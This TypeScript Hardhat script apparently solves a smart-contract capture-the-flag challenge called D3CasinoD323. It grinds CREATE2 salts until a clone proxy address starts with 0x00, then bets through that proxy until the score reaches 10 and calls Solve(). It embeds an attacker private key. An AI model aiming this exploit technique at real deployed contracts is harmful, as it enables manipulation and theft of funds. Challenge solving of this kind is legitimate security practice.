import chalk from "chalk";
import { ethers } from "hardhat";
import { D3CasinoD323__factory, D3CasinoD323, D3CasinoD323Attack__factory } from "../../typechain";
import { log, initialize } from "../utils";
import { randomBytes } from "crypto";

async function main() {
    let attackerPrivateKey = "0x027efa1d59b6a0710ce986dba26e0b91a8b5a5724866adf51702c168db0cb63d";
    // address 0x003cB973628ea442fb58d24CBf6cEb434E6b15cf  prefix:0x00
    let [d3CasinoD323Contract, attacker] = await initialize<D3CasinoD323>(D3CasinoD323__factory, attackerPrivateKey);
    const d3CasinoD323Attack = await new D3CasinoD323Attack__factory(attacker).deploy();
    await d3CasinoD323Attack.waitForDeployment();

    let proxyAddress;
    let score = 0;
    let tx;
    while (true) {
        let salt = '0x' + randomBytes(32).toString('hex');
        let predictedAddress = await d3CasinoD323Attack.predict(salt);
        if (predictedAddress.slice(2, 4) == "00") {  // proxy contract address prefix:0x00
            tx = await d3CasinoD323Attack.clone(salt);   // create proxy contract with 45 bytes
            await tx.wait();
            log(`Successfully deployed the proxy contract with zero prefix with salt ${chalk.yellow(salt)}`);
            proxyAddress = await d3CasinoD323Attack.proxyAddress();
            log(`Proxy contract address: ${chalk.yellow(proxyAddress)}`);
            let contractInterface = d3CasinoD323Attack.interface;
            let calldata = contractInterface.encodeFunctionData("bet", [await d3CasinoD323Contract.getAddress()]);
            tx = await attacker.sendTransaction({
                to: proxyAddress,
                data: calldata
            })
            await tx.wait(); // score++
            score = Number(await d3CasinoD323Contract.scores(attacker.address));
            log(`Score: ${score}`);
            if (Number(score) == 10) {
                break;
            }
        }
    }
    tx = await d3CasinoD323Contract.Solve();
    await tx.wait();
    log(`Solved with transaction ${chalk.yellow(tx.hash)}`);

}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});